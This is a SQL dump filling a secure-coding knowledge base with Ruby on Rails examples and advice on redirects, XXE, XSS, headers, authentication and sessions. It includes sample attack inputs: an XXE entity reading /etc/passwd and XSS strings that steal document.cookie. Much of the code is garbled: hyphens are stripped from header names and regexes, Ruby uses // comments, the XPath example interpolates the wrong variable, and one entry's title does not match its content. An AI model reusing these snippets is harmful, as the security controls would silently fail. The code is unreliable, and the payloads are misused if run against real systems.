', 'SQL query', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Open forwards & redirects


 Example:


	// When using forwards & redirects you should make sure the URL is being explicitly
	// declared in the code and cannot be manipulated by an attacker like:

	redirect_to params[:redirect]

	// Generally you should avoid getting input into the redirect which could contain
	// userinput by any means. if for any reason this may not be feasible than you
	// should make a whitelist input validation for the redirect

	def redirecting
		if params[:redirect] =~ %r{^https\:\/\/trustedsite.com\/.+$}
			redirect_to params[:redirect]
		end
	end', 'Open forwards & redirects', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' X Path query


 Example:


    require ''nokogiri''

    class XPathControl
      // Define the allowed characters and input parameter and count level for the
      // user lockout like:
      // call(params[:filename], "<''>&")

      def call(user, input_param, allowed_characters)
        encoder = Encoder.new
        encoded = encoder.encode(user, input_param, allowed_characters)

        if encoded
          doc = Nokogiri::XML(File.read(''file.xml''))

          // Assuming that you used the encoder function also for adding users, it will now retrieve the
          // user O''reily from the query
          query_result = doc.xpath("//lemonade[@supplier=\"//{doc}\"]/price")
        end
      end
    end
', 'X path query', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anti caching headers


 Example:

    
    // Add the following code to APP_DIR/config/environments/production.rb in order to prevent the browser from caching
    config.action_controller.perform_caching = false
    config.public_file_server.headers = {
      ''CacheControl'' => ''nocache, nostore''
    }
    // Add the pragma header also for enforcing older browsers
    config.action_dispatch.default_headers = {  
      ''Pragma'' => ''nocache'' 
    } 
', 'Anti caching headers', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Secure session cookies


 Example:

    
    // Add "secure: true" option to APP_DIR/config/initializers/session_store.rb
    Rails.application.config.session_store :cookie_store, key: ''SESSIONID'', expire_after: 1.hour, secure: true', 'Secure session cookies', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce secure passwords


 Example:


    // It is highly recommended to use Devise gem that handles authentication on your RoR app.
    // more info: https://github.com/plataformatec/devise
    // Then install Devise Security Extension gem (https://github.com/phatworx/devise_security_extension)
    // Follow the installing instructions mentioned on Github

    // After successful installation you should have created user''s views and controllers

    // Firstly, configure the mail settings

    // APP_DIR/config/environments/production.rb
    config.action_mailer.delivery_method = :smtp
    config.action_mailer.smtp_settings = {
    :address              => "smtp.yoursite.com",
    :port                 => 587,
    :user_name            => ENV[''email_username''], // it is not recommended to hardcode sensitive data
    :password             => ENV[''email_password''],
    :ssl                  => true,
    :enable_starttls_auto => true
    }

    // Now it''s time to configure the gem in APP_DIR/config/initializers/devise.rb
    // Uncomment and customize following lines of code
    config.password_archiving_count = 5
    config.deny_old_passwords = true


    // Now update your model
    // For example:
    class User < ApplicationRecord
      has_many :posts

      // add :recoverable that allows user reset the password
      devise :database_authenticatable, :registerable,
            :recoverable, :rememberable, :trackable, :secure_validatable
    end

', 'Password forget and disallow old passwords', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML External entities


 Example:

    
    // Typically parsing XML files is done by using external gems like Nokogiri. In Nokogiri using external entities
    // is turned off by default. Always check it in the documentation. If you want to be sure  turn off parsing external
    // entities explicitly.

    // Example of turning off parsing external entities in Nokogiri gem
    require ''nokogiri''
    xml = ''<!DOCTYPE root [ <!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<root><e>&ent;</e></root>''
    // "nonet" stands for No External Entities
    parsed_xml = Nokogiri::XML.parse(xml) { |config| config.nonet } 
    
    // parsed_xml.children.children.children.text should return now empty string
', 'XML External entities', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anti clickjacking headers


 Example:


    // Ruby on Rails sets XFrameOptions header with "SAMEORIGIN" option by default.
    // If in your case it doesn''t or you want to enforce "DENY" options, you can add that headers manually.

    // Add the following code to APP_DIR/config/environments/production.rb

    config.action_dispatch.default_headers = {
      ''XFrameOptions'' => ''DENY'' // this will completely prevent your page from being displayed in an iframe.
    }

    // OR

    config.action_dispatch.default_headers = {
      ''XFrameOptions'' => ''SAMEORIGIN'' // this will completely prevent your page from being displayed in an iframe on other sites.
    }
', 'Anti clickjacking headers', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Debug enabling


 Example:

    
    //By default debugging is disabled if the environment is set to "production".
    //If you want to make sure  check APP_DIR/config/environments/production.rb for:
    config.consider_all_requests_local = false // "true" enables debugging', 'Debug enabling', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Login functionality


 Example:


    // Like in other authenthication cases  Ruby on Rails use a gem called "Devise" to handle login functionality. 
    // Use generators below to create required staff
    $> rails generate devise:install
    $> rails g devise:views
    $> rails generate devise User
    $> rake db:migrate

    // Update your User model in APP_DIR/app/models/user.rb
    devise :database_authenticatable, :registerable,
        :recoverable, :rememberable, :trackable, :validatable

    // Set routes in APP_DIR/config/routes.rb
    devise_for :users

    // And finally create login view
    <h2>Log in</h2>

    <%= simple_form_for(resource, as: resource_name, url: session_path(resource_name)) do |f| %>
      <div class="forminputs">
        <%= f.input :email, required: false, autofocus: true %>
        // Remember turning off autocomplete on password field
        <%= f.input :password, required: false, autocomplete: off %> 
        <%= f.input :remember_me, as: :boolean if devise_mapping.rememberable? %>
      </div>

      <div class="formactions">
        <%= f.button :submit, "Log in" %>
      </div>
    <% end %>

    <%= render "devise/shared/links" %>

    // Also, remember turning on HTTPS on login site and setting cookies properly. More info: Secure session cookies.', 'Login functionality', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' User registration SQL truncation


 Example:


    // Ruby on Rails uses special gem called Devise to handle whole registration (and authentication). This gem makes you invulnerable to SQL truncation.
    // Always remember to enforce better security in the User model (more info: "Password storage"). It is highly recommended to enforce
    // SSL connection during user''s signing up and signing in (more info: "Secure session cookies").

    // Examples of models, views and controllers containing registration

    // User model
    class User < ApplicationRecord
      has_many :posts
      // Include default devise modules. Others available are:
      // :confirmable, :lockable, :timeoutable and :omniauthable
      devise :database_authenticatable, :registerable,
            :recoverable, :rememberable, :trackable
    end


    // Registration//new view
    <h2>Sign up</h2>

    <%= simple_form_for(resource, as: resource_name, url: registration_path(resource_name)) do |f| %>
      <%= f.error_notification %>

      <div class="forminputs">
        <%= f.input :email, required: true, autofocus: true %>
        <%= f.input :password, required: true, hint: ("//{@minimum_password_length} characters minimum" if @minimum_password_length) %>
        <%= f.input :password_confirmation, required: true %>
      </div>

      <div class="formactions">
        <%= f.button :submit, "Sign up" %>
      </div>
    <% end %>

    <%= render "devise/shared/links" %>

    // Devise has it own registration controller that can be seen here: https://github.com/plataformatec/devise/blob/master/app/controllers/devise/registrations_controller.rb', 'User registration SQL truncation', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Encoder


 Example:


    // This is the encoder method for whenever you have to allow certain
    // possibly dangerous characters into your code for i.e names such as O''reily

    class Encoder
      // include SanitizeHelper for the implementation of sanitize method
      include ActionView::Helpers::SanitizeHelper
      // and this one to provide sign_out
      include Devise::Controllers::SignInOut

      PATTERN = ''^[azAZ09%s]+$''.freeze

      attr_reader :store

      // If your application is running on multiple processes or machines make sure you use a keyvalue backend for Rails cache
      // like Redis or Memcached. If you''re using Unicorn/Passenger/Puma in clustered mode you''re already running multiple processes!
      // Alternatively you can provide your own implementation backed by either a keyvalue store or just your database.
      def initialize(store = Rails.cache)
        @store = store
      end

      def encode(user, input, allowed_characters)
        pattern = PATTERN % allowed_characters

        regex = Regexp.compile(pattern)

        unless input =~ regex
          cache_key = cache_key(user)
          store.increment(cache_key)

          // Every bad input validation has to be logged.
          Rails.logger.warn "//{user.id} > Bad user input"

          if store.fetch(cache_key) >= 3
            sign_out(user)
            store.delete(cache_key)
          end

          return false
        end

        sanitize(input)
      end

      private

      def cache_key(user)
        "//{user.cache_key}/input_counter"
      end
    end
', 'Encoder', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Aggregate user controls


 Example:


		// First of all, you have to know that Devise gem is AUTHENTICATION gem, not AUTHORIZATION.
		// Using "before_action" in specific controllers will provide only authentication.

		// It is recommended to use authorization gem like Pundit over creating your own code
		// more info: https://github.com/elabs/pundit

		// Quick introduction:

		// 1. Install gem and run generator  `rails g pundit:install`
		// 2. Create policies and update controllers
		// Policy example
			class PostPolicy
				attr_reader :user, :post

				def initialize(user, post)
					@user = user
					@post = post
				end

				def update?
					user.admin? || !post.published?
				end
			end

			// Controller authorization example
			def admin_list
				authorize Post // we don''t have a particular post to authorize
				// Rest of controller action
			end

		// 3. Make scopes for policies
		// 4. Ensure if policies and scopes are used
', 'Aggregate user controls', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password storage (salting sretching hashing)


 Example:

    
    // It is highly recommended to use Devise gem that handles authentication on your RoR app.
    // more info: https://github.com/plataformatec/devise

    // Configure the gem in APP_DIR/config/initializers/devise.rb
    config.stretches = Rails.env.test? ? 3 : 11

    // By default password hashing algorithm is set to BCRYPT which is good  it means that u can
    // leave it with default settings

    // Now update your model
    // For example:
    class User < ApplicationRecord
      has_many :posts

      // add :database_authenticatable to turn on password safe storing
      devise :database_authenticatable, :registerable,
            :recoverable, :rememberable, :trackable, :secure_validatable
    end

', 'Password storage(salting stretching hashing)', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Sandboxing


 Example:


<iframe sandbox="value">

		// sandbox=""  Applies all restrictions
		// allowforms  Reenables form submission
		// allowpointerlock  Reenables APIs
		// allowpopups  Reenables popups
		// allowsameorigin  Allows the iframe content to be treated as being from the same origin
		// allowscripts  Reenables scripts
		// allowtopnavigation  Allows the iframe content to navigate its toplevel browsing context', 'Sandboxing', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Identifier based authorization


 Example:


    def identifier_based_authorization(input_parameter, pattern, id_to_auth)
      validator = Validation.new

      // First, we want to filter the filenames for expected values. For this example we use only numeric
      // Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
      // for more information about validation see "input validations" in the code examples:
      return false unless validator.numeric?(input_parameter)

      // Second, we want to whitelist the filenames for expected values, in this example they are,
      // file1,file2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
      // pass the pattern to the check pattern, for instance  pattern = %w[file1 file2]
      return false unless check_pattern(input_parameter, pattern)

      // Whenever you are checking whether a user is restricted to review certain data,
      // the access restrictions should be processed serverside.
      user = User.find_by(auth_id: input_parameter)

      return true if id_to_auth == user.auth_id

      false
    end
', 'Identifier based authorization', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XXSSProtection header


 Example:


    // Ruby on Rails sets encoding header with "utf8" option by default.
    // If in your case it doesn''t or you want to set different encoding, you can do it manually.

    // Add the following code to APP_DIR/config/environments/production.rb
    config.encoding = ''utf8''
', 'Charsets', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XContentType header


 Example:


    // Ruby on Rails sets XContentTypeOptions header with "nosniff" option by default.
    // If in your case it doesn''t, you can add the header manually.

    // Add the following code to APP_DIR/app/controllers/YOUR_CONTROLLER.rb

    class YourController < ApplicationController
      def rendering_inline
        render inline: ''Content of the file'', content_type: ''application/foo''
      end

      def rendering_from_file
        render file: filename, content_type: ''application/foo''
      end
    end

', 'Content Type Headers', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML Injection Prevention


 Example:


    // Whenever you are using XML parsers you must sanitize or encode all userinput before
    // including this input into your XML file.

    // Some methods like below, the Dom document already encodes the input before storing it
    // into the XML. But beware, since this encoded input is still a threat whenever you are
    // displaying the this data on screen as HTML output. This encoded data should be escaped
    // at all times before displaying.

    // Whenever your XML function does not encode your data on the fly, you may want to write
    // your own function for achieving this. See the code examples and search for "Input encoding"
    // for more detailed information.

    require ''nokogiri''

    xml_doc = Nokogiri::XML(''<employees><employee><name></name></employee></employees>'')

    xml_doc.css(''employees employee name'').first.content = params[:name]

    // In Nokogiri gem HTML Encoding is done by default. Printing xml_doc.to_xml should return
    // => "<?xml version=\"1.0\"?>\n<employees>\n  <employee>\n    <name>&lt;script&gt;alert(\"1\")&lt;/script&gt;</name>\n  </employee>\n</employees>\n"

    // Always check if user input is properly encoded, because displaying XML may lead to multiple vulnerabilities, for instance  XSS.
', 'XML injection prevention', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Crossdomain.xml


 Example:


		// A bad example of a crossdomain.xml would be:

			<?xml version="1.0" ?>
			<crossdomainpolicy>
				<sitecontrol permittedcrossdomainpolicies="masteronly"/>
				<allowaccessfrom domain="*"/>
				<allowhttprequestheadersfrom domain="*" headers="*"/>
			</crossdomainpolicy>

		//	Because it allows acces from all other domains.

		//	Instead of this approach you might want to use the following restrictions. 
		//	Example by twitter''s crossdomain.xml:

			<?xml version="1.0" encoding="UTF8"?>
			<crossdomainpolicy xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" 
			xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd">
				<allowaccessfrom domain="twitter.com" />
				<allowaccessfrom domain="api.twitter.com" />
				<allowaccessfrom domain="search.twitter.com" />
				<allowaccessfrom domain="static.twitter.com" />
				<sitecontrol permittedcrossdomainpolicies="masteronly"/>
				<allowhttprequestheadersfrom domain="*.twitter.com" headers="*" secure="true"/>
			</crossdomainpolicy>', 'Crossdomain.xml', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' File upload


 Example:


    // Most of Ruby on Rails developers use specific gem to handle file upload. The most popular gem is to do this is Paperclip.

    // To install Paperclip follow instructions at https://github.com/thoughtbot/paperclip
    // Configuring gem is typical  creating proper model, views and controller.

    // Now something about security  create strong validation rules in model. For example:

    // File: APP_DIR/app/models/photo.rb
    validates_attachment :image,
                        presence: true,  validates if file is proper image
                        content_type: {content_type: %w(image/jpeg image/gif image/png)},  whitelist content type
                        size: {in: 0..10.kilobytes}  set maximum size of uploading
    validates_attachment_file_name :image, matches: [/^[azAZ09]$/]  allow only alphanumerical file names
    // Always upload files outside the website root directory 

    // Paperclip logs every upload action by default. If you want to turn logging on explicite add following line of code
    // to your APP_DIR/config/environments/production.rb
    Paperclip.options[:log] = true
', 'File upload', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Aggregate user controls


 Example:


    // First of all, you have to know that Devise gem is AUTHENTICATION gem, not AUTHORIZATION.
    // Using "before_action" in specific controllers will provide only authentication.

    // It is recommended to use authorization gem like Pundit over creating your own code
    // more info: https://github.com/elabs/pundit

    // However, for simple privilege based authentication we can use simpler gem like Petergate
    // more info: https://github.com/elorest/petergate

    // Quick introduction to Petergate gem:
    // 1. Use this generators
    $> rails g petergate:install
    $> rake db:migrate
    // 2. Configure roles in user.rb
    petergate(roles: [:admin, :editor], multiple: false)
    // 3. Setup permissions in the specific controller
    def YourController < ApplicationController
      access all: [:show, :index], user: {except: [:destroy]}, company_admin: :all
    end
', 'Privilege based authentication', 'ruby'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HTML output


 Example:


	// Whenever user input is displayed in the application, whether, as content or a parameter value
	// submitted towards the url, all user input should be properly escaped to prevent XSS injections.

	// For normal output it is recommended use sanitize with the most restrict options
	<%= sanitize(test, tags: [], attributes: []) %>

	// Security consists of different layers of protection, in order to guarantee the integrity
	// of your application. This means that the value submitted from the user should
	// already be sanitized before being submitted towards the database in order to prevent XSS.
	// As an example, you are expecting only alphanumerical value here:

	unless /^[azAZ09]+$/ =~ sanitize(input, tags: [], attributes: [])
		//do logout here
	end

	// This type of approach should be used whenever you are allowing userinput in
	// your DOM like for example, let''s say a user was allowed to upload an image and
	// set an alt text. when you do not sanitize his input a possible attack string could be:

	this is an image" onload="alert(''XSS'');"

	// whenever this string now is added to the users image this will be the outcome, leading
	// to xss:

	<img src="http://image.com/image.jpg" alt="this is an image" onload="alert(''XSS'')"" />

	// After this sanitation malicious code can no longer exist in the post_params array.

	// Another possibility for attackers to execute an XSS injection, is to pass malicious code directly
	// into the URL by means of a "href", e.g.:
	// javascript:alert(document.cookie);
	// or
	// data:text/html;base64,base64xssinjection

	// In the following scenario escaping with sanitize() is not sufficient to block the injection.
	// By checking the URL to see if it starts with either http:// or https:// whenever a link has
	// been submitted to the web application by a user.', 'HTML output', 'ruby'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('90',' Description:

Placing a logout link on every page that requires authentication helps the user end the
session when he is done with the site. Ending the session helps prevent hijacking.

 Solution:

Identify all pages that use authentication. Make a list of all pages on your site that use
authentication then verify the presence of logout links. Examine each page that uses
authentication to make sure it has a logout link in a location that can be
found intuitively.
', 'Logout structuring'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('101',' Description:

In cryptography, a certificate authority or certification authority (CA) is an entity that
issues digital certificates. A digital certificate certifies the ownership of a public key
by the named subject of the certificate. Sometimes it happens that a CA goes bad and is
revoked from the browser. This will lead to untrusted TLS connections if your application
uses an issued certificate from this CA.

 Solution:

It''s always a good idea to let multiple CA you trust create a certificate, the best way is that you create yourself the key pair (pub & priv) and let the CA sign it. This way you don''t need to ''leak'' your priv key and you have backup trusted certificates you can use as a backup when one goes ''bad''.
', 'CA certificates'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('65',' Description:

Whenever sensitive data is stored cleartext, this data is compromised as soon as it
falls into the hands of an attacker.

 Solution:

Sensitive data in all forms should always be stored by an encrypted manner.
We recommend to follow the "Secure Cryptographic datastorage" cheatsheet found on OWASP.

https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet
', 'Insecure datastorage'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('73',' Description:

Whenever organizations communicate by means of unencrypted connections, an attacker
could easily sniff insecure communications and access sensitive information.

 Solution:

Use TLS encrypted data lines for all internal communication channels.
Also, your infrastructure should not traverse unencrypted or weakly encrypted links. Because
if so, all your data''s integrity and confidentiality will be lost.
', 'Insecure internal communication'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('82',' Description:

Authentication should be enforced by the webserver. Whenever these configurations are
not enforced on the server, an attacker could gain access to authorized
pages on your application.

 Solution:

Always make sure your webserver and application are correctly configured to handle authentication. Also the application and webserver should deny access by default should there be an error of any kind.
', 'Authentication enforced by the web sever'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('149',' Description:

Whenever a cryptographic module does not fail securely this the device needs to be put in
error state so it''s not useable anymore.

 Solution:

We recommend using the National Institute of Standards and Technology (NIST) standard on testing the cryptographic module making it perform the selftests to see if it fails securely.
', 'cryptographic modules must fail securely'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('138',' Description:

You should always fend off remote connections with untrusted systems/resources which try to
connect to your application in order to prevent connecting to malicious systems that try
to attack your application.

 Solution:

Since this is very difficult to achieve on application level we recommend implementing
EGRESS firewall rules.
', 'Deny access from remote resources or systems'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('181',' Description:

The eval() function evaluates or executes an argument.

If the argument is an expression, eval() evaluates the expression. If the argument is one
or more JavaScript statements, eval() executes the statements.

This is exactly the reason why eval() should NEVER be used to parse JSON or other
formats of data which could possible contain malicious code.

 Solution:

For the purpose of parsing JSON we would recommend the use of the json.parse functionality.
Even though this function is more trusted you should always build your own security checks
and encoding routines around the json.parse before mutating the data or passing it on to
a view to be displayed in your HTML.
', 'Parsing JSON with Javascript'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('201',' Description:

Building an application should always be done on a server that you trust, you are in control of and
has the latest security patches and hardening configured. In some applications you can use security
techniques and modules that can protect your application from known security issues. Always use these
techniques when they are available.

 Solution:

Ensure that build processes for system level languages have all security flags enabled, such as
ASLR, DEP, and other security checks specific for your application need.
', 'Build proccess security hardening'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('194',' Description:

When using unsupported client side technologies which are not supported natively via
W3C browser standards. Your application could be open to different types of attacks.

 Solution:

Do not use Flash, ActiveX, Silverlight, NACL, clientside Java or other client side technologies
not supported natively via W3C browser standards.
', 'Do not support untrusted client side technologies'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('242',' Description:

Handling errors securely is a key aspect of secure coding.
There are two types of errors that deserve special attention. The first is exceptions
that occur in the processing of a security control itself. It''s important that these
exceptions do not enable behavior that the countermeasure would normally not allow.
As a developer, you should consider that there are generally three possible outcomes
from a security mechanism:

1. allow the operation
2. disallow the operation
3. exception

In general, you should design your security mechanism so that a failure will follow the same execution path
as disabling the operation

 Solution:

Make sure all the access control systems are thoroughly tested for failing securely before
using it in your application. It is common that complete unittest are created especially
for this purpose.
', 'All access controls must fail securely'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('130',' Description:

Revealing system data or debugging information helps an adversary learn about the system
and form a plan of attack. An information leak occurs when system data or debugging
information leaves the program through an output stream or logging function.

 Solution:

Verify that the HTTP headers do not expose detailed version information of system components. For each different type of server, there are hardening guides dedicated especially for this type of data leaking. The same applies for i.e any other leak of version information such as the version of your programming language or other services running to make your application function.
', 'Verbose version information'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('246',' Description:

If accounts for communicating between components have granted more privileges than
necessary, these accounts could impose a great threat whenever one of these components gets
compromised by attackers. 

i.e:
A web application running on root privileges which has a path traversal vulnerability
can be used to read both the "etc/passwd" file as well as reading the "etc/shadow" file.

These files can then be used in an offline password cracking attacks to recover accounts
on the server.

 Solution:

Communications between components, such as between the application server and the database 
server should be authenticated using an account with the least necessary privileges.
', 'Communication between components (low privileges)'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('148',' Description:

Whenever a cryptographic function is not implemented on the server side then these
cryptographic functions could easily be bypassed by an attacker.

 Solution:

Verify that all cryptographic functions used to protect secrets from the application
user are implemented server side.
', 'cryptographic function implementation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('154',' Description:

When working with sessions there are a couple of things you need to consider in order to implement them securely throughout your system. For more detailed information about these items you should check the knowledgebase about:
1.	Session management control
2.	Session cookies without the Secure flag
3.	Session cookies without the HTTP Only flag
4.	External session hijacking
5.	Insecure transmission of session cookies
6.	Session information is not stored server side
7.	Session ids should be generated with sufficient entropy, the preferred method is the frameworks default session management control implementation is used by the application
8.	User generated session ids should be rejected by the server
9.	The logout functionality should revoke the complete session
10.	The login functionality should always generate (and use) a new session id
11.	Session IDs do not timeout.(idle)
12.	Absolute session timed out
13.	Verify that the session id is never disclosed
14.	Session cookies (Domain)

 Solution:

The items as pointed out before should be looked into and taken into consideration
whenever you are working with sessions on your system in order to enforce a
high level of security.

Though there are more than ten design patterns related to session, all of them need to be implemented. 
If any one is left out for implementation, the whole session management layer is not secure and could be defeated by attackers.
', 'Sessions pattern'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('238',' Description:

Whenever the components are loaded from untrusted repositories this could imply the 
components are backdoored, outdated and cannot be trusted.

 Solution:

When checking if a repository can be trusted look to see if the source is stil maintained, 
security bugs are being reported and mitigated, if the component is not at the end of life or deprecated.

You can also scan the component in your SDLC through OWASP dependency checker to see if there are any
known CVEs for this component.
', 'Trusted repositories'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('63',' Description:

Whenever default or predictable accounts are available on an application/server this could
lead to an attacker compromising these services. Make sure all default and predictable
accounts are disabled or deleted from the services.

 Solution:

Verify that all keys and passwords are replaceable, and are generated or
replaced after installation time.
', 'Avoid the use of default and predictable acounts.'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('196',' Description:

Keys should remain in a protected key vault at all times. In particular, ensure that there
is a gap between the threat vectors that have direct access to the data and the threat
vectors that have direct access to the keys. This implies that keys should not be stored
on the application or web server (assuming that application attackers are part of the
relevant threat model).

 Solution:

Verify that all consumers of cryptographic services do not have direct access to key material.
Isolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM).
', 'Hardware key vault'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('72',' Description:

Authors of services which use the HTTP protocol SHOULD NOT use GETbased forms for the
submission of sensitive data, because this will cause this data to be
encoded in the RequestURI. Many existing servers, proxies,
and browsers will log the request URL in some place where it might be
visible to third parties. Servers can use POSTbased form submission instead.
GET parameters are also more likely to be vulnerable to XSS. Please refer to the
XSS manual in the knowledge base for more information.

 Solution:

Whenever transmitting sensitive data always do this by means of the POST request or by header.
Note: Avoid userinput in your application header, this could lead to vulnerabilities.
Also make sure you disable all other HTTP request methods which are unnecessary for
your applications operation such as; REST, PUT, TRACE, DELETE, OPTIONS, etc, since
allowing these request methods could lead to vulnerabilities and injections.
', 'GET POST requests'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('42',' Description:

The encryption techniques used in the application must be known and proven methods.
When there is a selfmade hashing algorithm developed, it is likely to contain
vulnerabilities due to mathflaws resulting in encryption which can be broken.

 Solution:

Never implement your own designed Crypto functions.
Verify that cryptographic modules used by the application have been validated against
FIPS 1402 or an equivalent standard.
', 'Unproven cryptographic algorithms'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('102',' Description:

Whenever an application provides TLS, all connections should be TLS otherwise the
encryption will be lost.

 Solution:

Verify that TLS is used for all connections
(including both external and backend connections) that are using authentication tokens or
that involve sensitive data or functions.
This should also be enforced in the application itself wherever possible,
for example: Secure flags on cookies, HSTS, certificate pinning etc.
', 'All connections should be TLS'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('195',' Description:

In order to establish trust between two communicating party''s such as servers and clients
there message payload should be signed by means of public/private key method. This builds trust
and makes it harder for attackers to impersonate different users.

 Solution:

Verify that the message payload is signed to ensure reliable transport between client and
service, using JSON Web Signing or WSSecurity for SOAP requests.
', 'Signed message payloads'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('87',' Description:

Whenever an application ask an user a secret question i.e a password forgot
functionality, these questions should not be shared knowledge an attacker could get from
the web to prevent him compromising the account by this function.

 Solution:

Secret questions should never include shared knowledge, predictable or easy
guessable values.
', 'No shared knowledge for secret questions'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('152',' Description:

For successful access control/login functionality there are a lot of things to take into
consideration before you start developing this type of functionality.

 Solution:

It is highly recommended to study all the listed items and implement these principles in
your access control/login system in order to enforce a higher level of security.

1. Audit logs
2. Principle of least privilege (Privilege based authentication system)
3. Passwords must be encrypted, salted and stretched
4. CrossSite Request Forgery (CSRF for authenticated forms)
5. Session pattern
6. Session fixation
7. Session hijacking
8. Forget password functions
9. Client side authentication
10. Client side state management
11. Cross subdomain cookie attack
', 'Access control pattern'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('30',' Description:

Whenever the opportunity to log into the application is offered, it should not lock out accounts. A hacker could abuse this function to make the application deny access towards its power users.

 Solution:

The application should not lockout users when they enter false login credentials.
', 'Denial of service by locking out accounts'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('261',' Description: 

Some data on an application can be consider sensitive due to its importance:
 Social security number
 Credit card or banking information
Or by the context of the information:
 Passphrase used as a password of an application
 University restricted or critical data

On applications, data considered sensitive should be kept safe. The way we secure the data could be defined by us, but some information it should be made according to a standard  i.e. all applications that manipulate credit card information should comply with one of the pci standards.


 Solution:

Identify the list of sensitive data that is being processed by the application.

Establish, maintain, and disseminate a security policy for processing and storing sensitive data. If information should be encrypted, separated in another database, etc. If exist, follow the appropriate standard.
', 'Policy for processing sensitive data'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('157',' Description:

Whenever you allow users to register on your system there are a couple of things you need
to take into consideration in order to enforce a high level of security
For more detailed information about these items you should check the knowledgebase about:

1.	Column Truncation SQL injection(for MySQL databases)
2.	Single input validation controls
3.	Audit logs
4.	Prevent password leaking
5.	Predictable password and or token generation
6.	Are all passwords hashed, salted and stretched
7.	Does the application enforce the use of secure passwords?


 Solution:

The items as pointed out before should be looked into and taken into consideration
whenever you are letting users register on your system in order to enforce a
high level of security.

Here are the steps described briefly.
For more detailed information you should look into these items in the knowledge base.

First, You enforce limits on the length of the users submits on the server side in order
to prevent him from truncating his submits. These limits have to correlate with the limits
you set in your column in the database.

Second, you should create a single user input validation control class which should
validate the expected input values in order to verify if the user is not tampering data
or injecting malicious code into your application. All infringements should be logged
and repercussions should be taken whenever these infringements are frequent.

Third, never display the user’s password on a screen anywhere.

Fourth, Whenever you generate a password for your users, this password should always
be randomized sufficiently.

Fifth, encrypt your passwords by proven cryptographic standards when storing them.

Sixth, Enforce secure passwords by implementing good password policies.
', 'User registration pattern'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('15',' Description:

In the development stage of an application, programmers add debugging information in order to debug certain functionalities. However, this stage often displays sensitive technical information. If an attacker gains this technical information, he can learn more about the operation of the application. The application should always display userfriendly messages only when put in a live environment.

 Solution:

The level of debugging information needs to be determined according to the environment where the code is running.
', 'Verbose error messaging'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('251',' Description:

Handling errors securely is a key aspect of secure coding.
There are two types of errors that deserve special attention. The first is exceptions
that occur in the processing of a security control itself. It''s important that these
exceptions do not enable behavior that the countermeasure would normally not allow.
As a developer, you should consider that there are generally three possible outcomes
from a security mechanism:

1. Allow the operation
2. Disallow the operation
3. Exception

In general, you should design your security mechanism so that a failure will follow the same execution path
as disabling the operation

 Solution:

Make sure all the error handling logic is thoroughly tested for failing securely before
